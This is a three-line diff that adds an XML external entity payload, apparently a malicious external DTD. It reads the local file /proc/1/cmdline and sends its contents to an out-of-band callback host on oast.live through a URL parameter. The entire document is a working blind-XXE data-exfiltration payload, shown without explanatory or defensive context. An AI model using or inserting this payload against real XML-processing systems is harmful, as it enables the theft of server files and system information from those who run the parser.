@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///proc/1/cmdline">
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://dbe3bvggjcf181a2u7j0rwpf33jw6c7xu.oast.live/leak?d=%file;'>">
+%all;
